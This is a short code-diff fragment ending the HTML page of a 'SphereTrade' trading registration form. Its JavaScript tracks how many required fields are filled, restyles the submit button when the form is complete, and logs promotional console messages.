+            let filledFields = 0;
+            
+            requiredFields.forEach(field => {
+                if (field.value.trim() !== '') {
+                    filledFields++;
+                }
+            });
+            
+            const progress = Math.round((filledFields / requiredFields.length) * 100);
+            
+            // Update progress indicator (you could add a progress bar here)
+            if (progress === 100) {
+                document.getElementById('submitBtn').style.background = 'linear-gradient(135deg, #48bb78 0%, #38a169 100%)';
+                document.getElementById('submitBtn').textContent = '🚀 Complete Registration';
+            }
+        }
+
+        // Monitor form progress
+        setInterval(updateFormProgress, 1000);
+
+        console.log('🚀 SphereTrade Registration System Initialized');
+        console.log('💰 Zero Brokerage Trading Platform');
+        console.log('📈 500X Margin Available');
+    </script>
+</body>
+</html>
